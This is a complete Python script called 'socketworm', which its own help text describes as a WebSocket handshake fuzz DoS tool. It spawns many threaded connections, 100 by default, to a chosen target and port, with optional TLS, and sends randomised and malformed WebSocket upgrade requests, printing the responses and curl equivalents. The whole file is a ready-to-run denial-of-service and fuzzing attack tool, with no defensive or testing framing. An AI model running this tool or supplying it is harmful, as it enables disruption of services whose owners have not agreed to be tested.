import argparse
import socket
import ssl
import threading
import time
import base64
import os
import random
import string

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

def random_key():
    return base64.b64encode(os.urandom(16)).decode()

def create_socket(host, port, use_tls):
    sock = socket.create_connection((host, port), timeout=5)
    if use_tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock

def fuzz_handshake(sock, host, port, use_tls):
    response = b""
    method = "GET"
    uri = random.choice(["/", "/a", "/1", "/?v=" + str(random.randint(0, 9999))])
    headers = {
        "Host": random.choice([sock.server_hostname if hasattr(sock, 'server_hostname') else host, "127.0.0.999", ""]),
        "Upgrade": random.choice(["websocket", "WebSocket", "weBsocket", ""]),
        "Connection": random.choice(["Upgrade", "upgrade", "keep-alive", ""]),
        "Sec-WebSocket-Key": random_key(),
        "Sec-WebSocket-Version": random.choice(["13", "12", "hybi-00", ""]),
        "Origin": random.choice(["http://socketworm.com", "ws://" + (sock.server_hostname if hasattr(sock, 'server_hostname') else host), ""]),
        "Sec-WebSocket-Protocol": random.choice(["chat, superchat", "unknown", ""]),
        "Sec-WebSocket-Extensions": random.choice(["permessage-deflate", "", "x-foo=bar"])
    }

    req = f"{method} {uri} HTTP/1.1\r\n"
    for k, v in headers.items():
        if v != "":
            req += f"{k}: {v}\r\n"
    req += "\r\n"

    curl_equivalent = f"curl -i -k {'https' if use_tls else 'http'}://{host}:{port}{uri} " + " ".join([f"-H \"{k}: {v}\"" for k, v in headers.items() if v != ""])

    start_time = time.time()
    sock.sendall(req.encode())
    try:
        response = sock.recv(4096)
    except Exception:
        response = b""
    end_time = time.time()

    elapsed_ms = round((end_time - start_time) * 1000, 2)
    return req, response, elapsed_ms, curl_equivalent

def attack_worker(idx, host, port, use_tls, verbose):
    try:
        sock = create_socket(host, port, use_tls)
        if verbose:
            print(f"{BLUE}[{idx}] Connected, sending fuzz handshake...{RESET}")
        req, response, elapsed_ms, curl_equivalent = fuzz_handshake(sock, host, port, use_tls)

        if verbose:
            print(f"{YELLOW}[{idx}] Fuzz sent, response time: {elapsed_ms} ms{RESET}")
            print(f"{BLUE}[{idx}] curl equivalent:\n{curl_equivalent}{RESET}")
            if response:
                print(f"{GREEN}[{idx}] Response:\n{response.decode(errors='ignore')}{RESET}")

        sock.close()
        print(f"{GREEN}[{idx}] Done.{RESET}")
    except Exception as e:
        print(f"{RED}[{idx}] Fail: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(description="socketworm – WebSocket handshake fuzz DoS tool")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--tls", action="store_true")
    parser.add_argument("--conn", type=int, default=100)
    parser.add_argument("--verbose", action="store_true")

    args = parser.parse_args()

    print(f"{BLUE}[*] Launching socketworm on {args.target}:{args.port} with {args.conn} connections...{RESET}")
    threads = []
    for i in range(args.conn):
        t = threading.Thread(
            target=attack_worker,
            args=(i, args.target, args.port, args.tls, args.verbose),
            daemon=True
        )
        t.start()
        threads.append(t)
        time.sleep(0.02)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
